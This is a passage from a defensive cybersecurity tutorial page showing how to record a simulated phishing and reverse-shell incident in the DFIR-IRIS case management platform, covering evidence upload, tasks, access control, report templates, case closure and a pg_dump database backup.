+<a id="__codelineno-33-43" name="__codelineno-33-43" href="#__codelineno-33-43"></a><span class="n">suspicious</span> <span class="n">by</span> <span class="n">default</span><span class="o">.&lt;</span><span class="n">br</span><span class="o">&gt;&lt;</span><span class="n">br</span><span class="o">&gt;</span><span class="n">If</span> <span class="n">you</span> <span class="n">experience</span> <span class="nb">any</span> <span class="n">issues</span> <span class="ow">or</span> <span class="n">have</span> <span class="n">question</span><span class="o">=</span>
+<a id="__codelineno-33-44" name="__codelineno-33-44" href="#__codelineno-33-44"></a><span class="n">s</span><span class="p">,</span> <span class="n">feel</span> <span class="n">free</span> <span class="n">to</span> <span class="n">reach</span> <span class="n">out</span> <span class="n">to</span> <span class="n">me</span> <span class="n">directly</span><span class="o">.&lt;</span><span class="n">br</span><span class="o">&gt;&lt;</span><span class="n">br</span><span class="o">&gt;</span><span class="n">Thank</span> <span class="n">you</span> <span class="k">for</span> <span class="n">your</span> <span class="n">coopera</span><span class="o">=</span>
+<a id="__codelineno-33-45" name="__codelineno-33-45" href="#__codelineno-33-45"></a><span class="n">tion</span><span class="o">.&lt;</span><span class="n">br</span><span class="o">&gt;&lt;</span><span class="n">br</span><span class="o">&gt;</span><span class="n">Best</span> <span class="n">regards</span><span class="p">,</span><span class="o">&lt;</span><span class="n">br</span><span class="o">&gt;&lt;</span><span class="n">br</span><span class="o">&gt;</span><span class="n">IT</span> <span class="n">helpdesk</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;&lt;/</span><span class="n">div</span><span class="o">&gt;&lt;/</span><span class="n">div</span><span class="o">&gt;&lt;/</span><span class="n">div</span><span class="o">&gt;&lt;/</span><span class="n">div</span><span class="o">&gt;&lt;/=</span>
+<a id="__codelineno-33-46" name="__codelineno-33-46" href="#__codelineno-33-46"></a><span class="n">div</span><span class="o">&gt;&lt;/</span><span class="n">div</span><span class="o">&gt;&lt;/</span><span class="n">div</span><span class="o">&gt;</span>
+<a id="__codelineno-33-47" name="__codelineno-33-47" href="#__codelineno-33-47"></a>
+<a id="__codelineno-33-48" name="__codelineno-33-48" href="#__codelineno-33-48"></a><span class="o">--</span><span class="mf">000000000000e1</span><span class="n">ecfe0629387b6c</span><span class="o">--</span>
+</code></pre></div>
+<p>Let’s start by uploading the <code>email.eml</code> file, which contains the original phishing email. To do this, we’ll go to our case, click on the database icon located in the upper right corner of the window, and open the datastore.</p>
+<p>Within our case, there are three subdirectories: <em>Evidences</em>, <em>IOCs</em>, and <em>Images</em>. To add the file to the <em>Evidences</em> folder, we’ll click the <em>+</em> icon next to the folder name and then select <em>Add file</em>.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2031.png" data-desc-position="bottom"><img alt="image.png" src="image%2031.png"></a></p>
+<p>We’ll start by browsing for the file. Once selected, the <em>Filename</em> field will automatically populate with the file name. Next, we’ll add a brief description: <em>Email that delivered setup.exe to the user</em>. We’ll tag the file with <em>phishing</em> and <em>malware</em>, then select <em>File is Evidence</em> to ensure it’s included in the <em>Evidence</em> tab.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2032.png" data-desc-position="bottom"><img alt="image.png" src="image%2032.png"></a></p>
+<p>Once we click <em>Save</em>, the file will appear in the <em>Evidences</em> folder within the datastore.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2033.png" data-desc-position="bottom"><img alt="image.png" src="image%2033.png"></a></p>
+<p>As we selected <em>File is Evidence</em> for each uploaded file, they were all registered as evidence under the case’s <em>Evidences</em> tab. Each entry includes its corresponding SHA256 hash.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2034.png" data-desc-position="bottom"><img alt="image.png" src="image%2034.png"></a></p>
+<h3 id="collaboration-and-access-management"><strong>Collaboration and Access Management</strong></h3>
+<p>During incident response, we generally operate as part of a team, maintaining regular communication with our team members.</p>
+<p>To add a comment, navigate to the <em>Timeline</em> tab and click on the speech bubble icon located in the upper right corner of the event. We can add multiple comments or questions here, simulating a chat.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2035.png" data-desc-position="bottom"><img alt="image.png" src="image%2035.png"></a></p>
+<p>In IRIS, we can also create and assign tasks. To do this, navigate to the <em>Tasks</em> tab and click <em>Add task</em> in the upper right corner of the window.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2036.png" data-desc-position="bottom"><img alt="image.png" src="image%2036.png"></a></p>
+<p>In the task creation window, we’ll:</p>
+<ol>
+<li>Assign the task to <em>administrator</em> (the only user for now).</li>
+<li>Set the <em>Status</em> to <em>To do</em>.</li>
+<li>Add a <em>Task Title</em>: <em>Upload install.ps1 file to evidence</em>.</li>
+<li>Include a detailed <em>Description</em>: <em>The install.ps1 file was used to create a reverse shell on WS2019 to establish persistence. Upload a copy to evidence.</em></li>
+<li>Tag the task with <em>malware</em> and <em>reverse shell</em>.</li>
+</ol>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2037.png" data-desc-position="bottom"><img alt="image.png" src="image%2037.png"></a></p>
+<p>To create the task, we click the <em>Save</em> button. This adds it to the list of tasks displayed in the <em>Tasks</em> tab.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2038.png" data-desc-position="bottom"><img alt="image.png" src="image%2038.png"></a></p>
+<p>To manage user access, go to the <em>Advanced</em> dropdown in the sidebar and select <em>Access Control</em>. This allows you to control who can access specific cases or case types.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2039.png" data-desc-position="bottom"><img alt="image.png" src="image%2039.png"></a></p>
+<p>Here, we see <em>Users</em> and <em>Groups</em> as the main permission entities. The <em>Users</em> section displays a list of all individual users.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2040.png" data-desc-position="bottom"><img alt="image.png" src="image%2040.png"></a></p>
+<p>Currently, we only have one user, <em>administrator</em>. We’ll select this user and navigate to the <em>Cases access</em> tab.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2041.png" data-desc-position="bottom"><img alt="image.png" src="image%2041.png"></a></p>
+<p>The <em>Cases access</em> tab shows that the <em>administrator</em> user has full access to one case, <em>[2024-12-16] Data breach</em>. To grant or restrict access to additional cases, we can click the <em>Set case access</em> button.</p>
+<h3 id="generating-a-report"><strong>Generating a Report</strong></h3>
+<p>We can generate reports using a report template, which ensures completeness and consistency across cases while saving time. An IRIS report template is a file that includes various tags representing different types of content.</p>
+<p>To view the default IRIS investigations report template, we’ll go to the <em>Advanced</em> dropdown in the sidebar menu and select <em>Report Templates</em>.</p>
+<p>We can download an example of an <a href="https://docs.dfir-iris.org/operations/example_reports/iris_report_template.docx"><em>investigation template</em></a> and an <a href="https://docs.dfir-iris.org/operations/example_reports/iris_activity_report_template.docx"><em>activities report template</em></a>.
+Click Add template and upload investigation template.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2042.png" data-desc-position="bottom"><img alt="image.png" src="image%2042.png"></a></p>
+<p>Add the following details:</p>
+<ul>
+<li>Template name: Investigation</li>
+<li>Template type: Investigation</li>
+<li>Template language: English</li>
+<li>Template description: Investigation</li>
+<li>Template name format: %case_name%_%date%</li>
+<li>Template file: iris_report_template.docx (investigation template)</li>
+</ul>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2043.png" data-desc-position="bottom"><img alt="image.png" src="image%2043.png"></a></p>
+<p>To open the investigation template, double-click on the .docx file. By default, it will open in <em>LibreOffice</em>, an open-source office suite, on our Ubuntu machine.</p>
+<p>Let’s take a look at the cover page. The <code>{{ case.name }}</code> tag represents the case name, <code>{{ doc_id }}</code> corresponds to the IRIS document ID, and <code>{{ date }}</code> represents the current date. When the template is processed, these placeholders will be replaced with the relevant data at that point in time.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2044.png" data-desc-position="bottom"><img alt="image.png" src="image%2044.png"></a></p>
+<p>Now, let’s examine the asset list on page 3. Here, we see a small table generated using a Jinja2 for loop. The loop begins with <code>{%tr for asset in assets %}</code> and ends with <code>{%tr endfor %}</code>. For each asset, a row is created that includes its <em>name</em>, <em>type</em>, <em>compromise status</em>, and <em>description</em>, each represented by corresponding tags. The template can be customised to add or remove elements as needed.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2045.png" data-desc-position="bottom"><img alt="image.png" src="image%2045.png"></a></p>
+<p>To generate an IRIS report, navigate to the <em>Summary</em> tab of the case and click the <em>Generate report</em> button.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2046.png" data-desc-position="bottom"><img alt="image.png" src="image%2046.png"></a></p>
+<p>This opens a window where we can choose a report template. We’ll select <em>Investigation</em>. Click the <em>Generate</em> button to create and download the report. Alternatively, we can click the <em>Generate in Safe Mode</em> button on the left. This option generates the report without including images.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2047.png" data-desc-position="bottom"><img alt="image.png" src="image%2047.png"></a></p>
+<p>Now that the report is generated, let’s inspect the changes. Open the file by double-clicking it in the downloads list. Start by reviewing the cover page again.</p>
+<p>This time, the placeholders have been replaced with actual data. The <code>{{ case.name }}</code> tag now shows the case name, <em>"#2 - [2024-12-16] Data breach"</em>. Similarly, <code>{{ doc_id }}</code> is replaced with <em>"241217_0930"</em> and <code>{{ date }}</code> displays <em>"2024-12-17"</em>.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2048.png" data-desc-position="bottom"><img alt="image.png" src="image%2048.png"></a></p>
+<p>A similar update occurred on page 3 with the asset list. The for loop populated the table with four rows, each representing the assets we created: <em>WS2019</em>, <em>Splunk</em>, <em>splunk</em>, and <em>Administrator</em>.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2049.png" data-desc-position="bottom"><img alt="image.png" src="image%2049.png"></a></p>
+<h3 id="case-closure-and-database-backup"><strong>Case Closure and Database Backup</strong></h3>
+<p>Once incident response concludes and all tasks are completed, the case can be closed. To do this, navigate to the <em>Summary</em> tab and click the <em>Manage</em> button, identified by the gear icon.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2050.png" data-desc-position="bottom"><img alt="image.png" src="image%2050.png"></a></p>
+<p>Before closing the case, we need to update its <em>Outcome</em>. To do this, click the <em>Edit</em> button.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2051.png" data-desc-position="bottom"><img alt="image.png" src="image%2051.png"></a></p>
+<p>In the <em>Outcome</em> dropdown, we can choose from several options:</p>
+<ul>
+<li><em>Unknown</em>: No clear outcome was determined.</li>
+<li><em>False Positive</em>: The investigation confirmed no attack occurred.</li>
+<li><em>True Positive with impact</em>: An attack occurred, affecting the organisation.</li>
+<li><em>True Positive without impact</em>: An attack occurred but caused no impact.</li>
+<li><em>Not applicable</em>: The investigation was not completed.</li>
+</ul>
+<p>We’ll select <em>True Positive with impact</em>.</p>
+<p>At the bottom left of the window, there are two choices: <em>Delete case</em> and <em>Close case</em>. We’ll choose <em>Close case</em> to finalise it.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2052.png" data-desc-position="bottom"><img alt="image.png" src="image%2052.png"></a></p>
+<p>A pop-up window will appear, asking for confirmation to close the case. We’ll click <em>OK</em> to confirm. Once confirmed, the case will be closed, and the page colour will update to reflect its closed status.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2053.png" data-desc-position="bottom"><img alt="image.png" src="image%2053.png"></a></p>
+<p>To retain data, we usually create a copy for storage elsewhere. While IRIS doesn’t allow copying individual cases, we can back up the entire IRIS database, which includes all cases, using the <code>pg_dump</code> command. 
+Since IRIS runs inside a Docker container, we’ll need to use <code>docker exec</code> to run the command within the container.</p>
+<p>First, we need to identify the container ID where IRIS is running. We can do this by executing:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="n">sudo</span> <span class="n">docker</span> <span class="n">container</span> <span class="n">ls</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">iriswebapp_db</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="n">cyber</span><span class="nd">@Iris</span><span class="p">:</span><span class="o">~/</span><span class="n">iris</span><span class="o">-</span><span class="n">web</span><span class="err">$</span> <span class="n">sudo</span> <span class="n">docker</span> <span class="n">container</span> <span class="n">ls</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">iriswebapp_db</span>
+<a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a><span class="p">[</span><span class="n">sudo</span><span class="p">]</span> <span class="n">password</span> <span class="k">for</span> <span class="n">cyber</span><span class="p">:</span> 
+<a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a><span class="mi">08</span><span class="n">ad6d02ce90</span>   <span class="n">ghcr</span><span class="o">.</span><span class="n">io</span><span class="o">/</span><span class="n">dfir</span><span class="o">-</span><span class="n">iris</span><span class="o">/</span><span class="n">iriswebapp_db</span><span class="p">:</span><span class="n">latest</span>      <span class="s2">"docker-entrypoint.s…"</span>   <span class="mi">7</span> <span class="n">hours</span> <span class="n">ago</span>   <span class="n">Up</span> <span class="mi">7</span> <span class="n">hours</span>             <span class="mi">5432</span><span class="o">/</span><span class="n">tcp</span>                                                               <span class="n">iriswebapp_db</span>
+</code></pre></div>
+<p>Next, we’ll use the container ID with the <code>docker exec</code> command to back up the database. We’ll run the following:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="n">sudo</span> <span class="n">docker</span> <span class="n">exec</span> <span class="mi">08</span><span class="n">ad6d02ce90</span> <span class="n">pg_dump</span> <span class="o">-</span><span class="n">U</span> <span class="n">postgres</span> <span class="n">iris_db</span> <span class="o">|</span> <span class="n">gzip</span> <span class="o">&gt;</span> <span class="n">iris_db_backup</span><span class="o">.</span><span class="n">gz</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="n">cyber</span><span class="nd">@Iris</span><span class="p">:</span><span class="o">~/</span><span class="n">iris</span><span class="o">-</span><span class="n">web</span><span class="err">$</span> <span class="n">sudo</span> <span class="n">docker</span> <span class="n">exec</span> <span class="mi">08</span><span class="n">ad6d02ce90</span> <span class="n">pg_dump</span> <span class="o">-</span><span class="n">U</span> <span class="n">postgres</span> <span class="n">iris_db</span> <span class="o">|</span> <span class="n">gzip</span> <span class="o">&gt;</span> <span class="o">../</span><span class="n">iris_db_backup</span><span class="o">.</span><span class="n">gz</span>
+</code></pre></div>
+<p>Alternatively, we can create a backup directly from the IRIS web application. To do this:</p>
+<ol>
+<li>Navigate to <em>Advanced &gt; Server settings &gt; Backups &gt; Database</em>.</li>
+<li>Click on <em>Backup database</em>.</li>
+</ol>
+<p>Before doing this, we need to set the <code>BACKUP_PATH</code> environment variable to specify the destination directory where the backup will be stored.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2054.png" data-desc-position="bottom"><img alt="image.png" src="image%2054.png"></a></p>
+<h2 id="references"><strong>References</strong></h2>
+<ul>
+<li><a href="https://docs.dfir-iris.org/latest/">https://docs.dfir-iris.org/latest/</a></li>
+<li><a href="https://github.com/dfir-iris/iris-web">https://github.com/dfir-iris/iris-web</a></li>
+<li><a href="https://youtu.be/XXyIv_aes4w?si=L2Kn1BNXyEdVXwwI">https://youtu.be/XXyIv_aes4w?si=L2Kn1BNXyEdVXwwI</a></li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"></path></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer">
+        
+          
+          <a href="../thehive/thehive.html" class="md-footer__link md-footer__link--prev" aria-label="Previous: TheHive">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"></path></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                TheHive
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../understanding-SOAR/understanding-SOAR.html" class="md-footer__link md-footer__link--next" aria-label="Next: Understanding SOAR">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                Understanding SOAR
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"></path></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      © 2024–2026 <a href="https://github.com/cyberdefencekit" target="_blank" rel="noopener">Cyber Defence Kit by Joseph Jee</a>
+
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/cyberdefencekit" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M202.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1M496 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2m-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3m-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1"></path></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "..", "features": ["content.code.annotate", "content.code.copy", "content.tabs.link", "header.autohide", "announce.dismiss", "navigation.footer", "navigation.indexes", "navigation.sections", "navigation.tabs", "navigation.top", "navigation.tracking", "navigation.expand", "search.highlight", "search.share", "search.suggest", "toc.integrate"], "search": "../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  
+<script id="init-glightbox">const lightbox = GLightbox({"touchNavigation": true, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});
+document$.subscribe(()=>{ lightbox.reload(); });
+</script></body></html>
